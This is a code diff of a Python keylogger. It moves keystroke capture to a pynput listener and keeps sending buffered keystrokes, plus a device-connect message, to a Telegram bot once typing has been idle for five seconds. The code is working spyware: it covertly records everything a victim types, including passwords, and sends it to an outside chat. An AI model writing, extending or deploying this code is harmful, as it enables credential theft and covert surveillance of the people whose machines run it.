@@ -1,11 +1,12 @@
 import asyncio
-import keyboard
+# import keyboard
 import socket
 import time
 import uuid
 from datetime import datetime
+from pynput import keyboard
 
-from replace import char_replacements
+# from replace import char_replacements
 from tg_output_bot import bot, TOKEN, CHAT_ID
 
 buffer_for_tg = ""
@@ -20,15 +21,20 @@ modified_time = time.time()
 
 def on_key_event(key):
     global buffer_for_tg, modified_time
-    char = key.name
-    if char in char_replacements:
-        char = char_replacements[char]
+    if hasattr(key, 'char'):
+        char = str(key.char)
+    elif key == keyboard.Key.space:
+        char = " "
+    else:
+        char = str(f"[{key}]")
     buffer_for_tg += char
     modified_time = time.time()
 
 
-def capture_kb():
-    keyboard.on_press(on_key_event)
+async def capture_kb():
+    listener = keyboard.Listener(
+        on_press=on_key_event)
+    listener.start()
 
 
 # noinspection PyBroadException
@@ -45,6 +51,7 @@ async def device_connect_msg():
 # noinspection PyBroadException
 async def recursive_part():
     global buffer_for_tg, modified_time
+
     if buffer_for_tg != "":
         if time.time() - modified_time > 5.0:
             try:
@@ -56,16 +63,21 @@ async def recursive_part():
 
 
 async def main():
-    capture_kb()
-
     try:
         await device_connect_msg()
     except KeyboardInterrupt:
         await device_connect_msg()
+
+    try:
+        await capture_kb()
+    except KeyboardInterrupt:
+        await capture_kb()
+
     while True:
         try:
             await recursive_part()
         except KeyboardInterrupt:
             await recursive_part()
+
 
 asyncio.run(main())
